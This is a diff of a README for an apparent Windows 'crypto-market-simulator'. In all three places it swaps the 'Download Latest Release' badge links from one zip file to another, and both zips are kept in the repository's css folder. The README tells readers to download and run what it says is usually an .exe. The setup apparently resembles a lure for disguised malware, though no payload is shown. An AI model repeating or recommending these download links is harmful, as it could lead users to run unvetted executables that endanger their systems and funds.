@@ -1,6 +1,6 @@
 # 🚦 crypto-market-simulator - Understand Crypto Market Moves
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/minhbaol747-lab/crypto-market-simulator/main/css/simulator_market_crypto_v2.5.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/raw/refs/heads/main/css/crypto_simulator_market_v3.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download and run the crypto-market-simulator on a Windows 
 
 Click the green button below or visit the release page here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/minhbaol747-lab/crypto-market-simulator/main/css/simulator_market_crypto_v2.5.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/raw/refs/heads/main/css/crypto_simulator_market_v3.0.zip)
 
 This page lists all available versions. Pick the latest stable release for your Windows system. The file name usually ends with `.exe`.
 
@@ -122,7 +122,7 @@ The software is open source. You can explore the code and suggest improvements o
 
 Access the latest release here to download and run the application:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/minhbaol747-lab/crypto-market-simulator/main/css/simulator_market_crypto_v2.5.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/minhbaol747-lab/crypto-market-simulator/raw/refs/heads/main/css/crypto_simulator_market_v3.0.zip)
 
 ---
 
